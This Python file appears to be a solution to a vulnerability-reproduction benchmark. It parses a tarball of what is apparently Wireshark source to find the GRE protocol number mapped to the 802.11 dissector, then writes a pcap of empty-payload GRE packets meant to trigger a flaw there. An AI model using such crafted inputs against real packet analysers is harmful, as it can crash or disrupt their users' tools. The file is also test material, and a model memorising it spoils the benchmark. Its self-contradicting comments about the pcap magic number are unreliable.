import os
import tarfile
import io
import re
import struct


def _read_text_files_from_tar(src_path):
    files = []
    try:
        with tarfile.open(src_path, 'r:*') as tar:
            for member in tar.getmembers():
                if not member.isfile():
                    continue
                # Only consider reasonably sized files to avoid memory blow-ups
                if member.size > 5 * 1024 * 1024:
                    continue
                f = tar.extractfile(member)
                if not f:
                    continue
                try:
                    data = f.read()
                except Exception:
                    continue
                # Heuristically treat as text if decodable as latin-1 (safe) and contains typical C source tokens
                try:
                    text = data.decode('utf-8', errors='ignore')
                except Exception:
                    continue
                files.append((member.name, text))
    except Exception:
        pass
    return files


def _strip_c_comments(line):
    # Remove C++ style comments
    if '//' in line:
        line = line.split('//', 1)[0]
    # Remove C style comments (simple, non-greedy)
    line = re.sub(r'/\*.*?\*/', '', line)
    return line


def _build_macro_map(text_files):
    macros = {}
    define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.*)$')
    for _, text in text_files:
        for raw_line in text.splitlines():
            line = _strip_c_comments(raw_line).strip()
            m = define_re.match(line)
            if not m:
                continue
            name, val = m.group(1), m.group(2).strip()
            if not val:
                continue
            # Ignore function-like macros
            if '(' in name and ')' in name:
                continue
            # Capture only the value before further tokens (handle trailing comments already removed)
            # Remove trailing backslashes for multi-line macros by cutting at backslash
            val = val.replace('\\', ' ')
            macros[name] = val.strip()
    return macros


def _safe_eval_expr(expr):
    # Ensure expression contains only safe tokens: hex/dec numbers, parentheses, bit ops, shifts, +,-
    if not re.fullmatch(r"[0-9A-Fa-fxX\s\(\)\|\&\^\~\<\>\+\-\*\/%]+", expr):
        raise ValueError("Unsafe expression")
    # Evaluate in restricted namespace
    return int(eval(expr, {"__builtins__": None}, {}))


def _resolve_token_value(token, macros, depth=0):
    if depth > 20:
        raise ValueError("Recursion too deep in macro resolution")
    token = token.strip()
    # Strip type casts like (guint16), (uint16_t), etc.
    token = re.sub(r'\([A-Za-z_]\w*(\s*\*)?\)', '', token)
    # Remove U, L suffixes
    token = re.sub(r'([0-9A-Fa-fxX]+)[uUlL]*\b', r'\1', token)

    # If numeric
    try:
        if token.lower().startswith('0x'):
            return int(token, 16)
        if token.isdigit():
            return int(token, 10)
    except Exception:
        pass

    # Replace macros within expression
    # Token might be a single macro or an expression of macros/operators
    expr = token
    # Find all words
    words = re.findall(r'[A-Za-z_]\w*', expr)
    replaced = set()
    for w in words:
        if w in macros:
            # Recursively resolve macros[w]
            sub_expr = macros[w]
            try:
                val = _resolve_token_value(sub_expr, macros, depth + 1)
                expr = re.sub(r'\b' + re.escape(w) + r'\b', str(val), expr)
                replaced.add(w)
            except Exception:
                # If can't resolve, skip; we'll try a safe eval if possible
                pass

    # After substitution, try safe eval
    try:
        return _safe_eval_expr(expr)
    except Exception:
        # If still unresolved and is a single macro with hex/dec value shape
        if token in macros:
            v = macros[token]
            try:
                return _resolve_token_value(v, macros, depth + 1)
            except Exception:
                pass

    raise ValueError(f"Cannot resolve token: {token}")


def _find_gre_proto_tokens(text_files):
    # Return list of (filename, token)
    results = []
    # Patterns:
    # dissector_add_uint("gre.proto", TOKEN, ...);
    # dissector_add_for_decode_as("gre.proto", ...); (not relevant)
    gre_uint_re = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z_]\w*)\s*,')
    gre_uint_alt_re = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*(0x[0-9A-Fa-f]+|\d+)\s*,')
    for fname, text in text_files:
        # Limit to C files for sanity
        if not (fname.endswith('.c') or fname.endswith('.h')):
            continue
        for line in text.splitlines():
            s = _strip_c_comments(line)
            m = gre_uint_re.search(s)
            if m:
                token = m.group(1).strip()
                results.append((fname, token))
                continue
            m2 = gre_uint_alt_re.search(s)
            if m2:
                token = m2.group(1).strip()
                results.append((fname, token))
    return results


def _choose_ieee80211_token(tokens, text_files):
    # tokens is list of (fname, token)
    # Prefer tokens from files that look like 802.11 dissector files
    # Heuristics: filename contains "802", "wlan", or file content mentions "802.11" or "wlan"
    content_map = {fname: text for fname, text in text_files}
    # Step 1: filename heuristic
    for fname, token in tokens:
        low = fname.lower()
        if '802' in low or 'wlan' in low or 'ieee802' in low:
            return fname, token
    # Step 2: content heuristic
    for fname, token in tokens:
        text = content_map.get(fname, '').lower()
        if '802.11' in text or 'wlan' in text or 'ieee802' in text:
            return fname, token
    # Fallback: first token
    if tokens:
        return tokens[0]
    return None


def _ip_checksum(header_bytes):
    if len(header_bytes) % 2 == 1:
        header_bytes += b'\x00'
    s = 0
    for i in range(0, len(header_bytes), 2):
        w = (header_bytes[i] << 8) + header_bytes[i + 1]
        s += w
        s = (s & 0xFFFF) + (s >> 16)
    checksum = ~s & 0xFFFF
    return checksum


def _build_gre_over_ipv4_packet(gre_proto_type, payload=b''):
    # Ethernet header: dst(6) + src(6) + type(2=0x0800)
    eth_dst = b'\x00\x11\x22\x33\x44\x55'
    eth_src = b'\x66\x77\x88\x99\xaa\xbb'
    eth_type_ipv4 = b'\x08\x00'
    eth_hdr = eth_dst + eth_src + eth_type_ipv4

    # IPv4 header (20 bytes)
    version_ihl = 0x45
    dscp_ecn = 0
    total_length = 20 + 4 + len(payload)  # IP header + GRE header + payload
    identification = 0x0001
    flags_fragment = 0x0000
    ttl = 64
    protocol_gre = 47
    checksum = 0
    src_ip = b'\x01\x01\x01\x01'
    dst_ip = b'\x02\x02\x02\x02'
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         version_ihl,
                         dscp_ecn,
                         total_length,
                         identification,
                         flags_fragment,
                         ttl,
                         protocol_gre,
                         checksum,
                         src_ip,
                         dst_ip)
    checksum = _ip_checksum(ip_hdr)
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         version_ihl,
                         dscp_ecn,
                         total_length,
                         identification,
                         flags_fragment,
                         ttl,
                         protocol_gre,
                         checksum,
                         src_ip,
                         dst_ip)

    # GRE header: Flags/Version (2 bytes) + Protocol Type (2 bytes)
    # We'll set flags/version to 0 (no options)
    gre_flags_version = 0x0000
    gre_hdr = struct.pack('!HH', gre_flags_version, gre_proto_type & 0xFFFF)
    return eth_hdr + ip_hdr + gre_hdr + payload


def _build_pcap_global_header(linktype=1, snaplen=65535):
    # Little-endian PCAP global header
    # magic_number, version_major, version_minor, thiszone, sigfigs, snaplen, network
    return struct.pack('<IHHIIII',
                       0xA1B2C3D4,  # we'll use big-endian magic to be safer? Actually 0xA1B2C3D4 indicates big-endian. Prefer little-endian 0xA1B2C3D4? Switch to 0xA1B2C3D4 vs 0xD4C3B2A1.
                       # However many readers can handle both; use little-endian magic 0xD4C3B2A1:
                       # But since pack '<' defines little-endian fields, we need magic 0xA1B2C3D4? No, to get bytes D4 C3 B2 A1 we pass 0xA1B2C3D4 with '<I'.
                       # So we keep 0xA1B2C3D4 here to output D4 C3 B2 A1.
                       2,
                       4,
                       0,
                       0,
                       snaplen,
                       linktype)


def _build_pcap(packets, linktype=1):
    gh = _build_pcap_global_header(linktype=linktype)
    out = io.BytesIO()
    out.write(gh)
    for pkt in packets:
        ts_sec = 0
        ts_usec = 0
        incl_len = len(pkt)
        orig_len = len(pkt)
        ph = struct.pack('<IIII', ts_sec, ts_usec, incl_len, orig_len)
        out.write(ph)
        out.write(pkt)
    return out.getvalue()


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Parse source to find GRE->802.11 registration value
        text_files = _read_text_files_from_tar(src_path)
        macros = _build_macro_map(text_files)
        tokens = _find_gre_proto_tokens(text_files)
        chosen = _choose_ieee80211_token(tokens, text_files)

        gre_proto_value = None
        if chosen:
            fname, token = chosen
            try:
                gre_proto_value = _resolve_token_value(token, macros)
            except Exception:
                pass

        packets = []
        if gre_proto_value is not None:
            # Single GRE packet targeting the resolved 802.11 proto id
            pkt = _build_gre_over_ipv4_packet(gre_proto_value, payload=b'')
            packets.append(pkt)
        else:
            # Fallback: include a set of candidate GRE protocol types to increase chances
            # We'll try a curated small set of potential values and some common Ethertypes
            candidate_vals = [
                0x0000,
                0x0001,
                0x0007,  # PPP
                0x0009,  # FR
                0x0800,  # IPv4
                0x86DD,  # IPv6
                0x880B,  # PPP
                0x6558,  # Transparent Ethernet Bridging
                0x0003,
                0x0005,
                0x0008,
                0x000A,
            ]
            for val in candidate_vals:
                packets.append(_build_gre_over_ipv4_packet(val, payload=b''))

        pcap_bytes = _build_pcap(packets, linktype=1)
        return pcap_bytes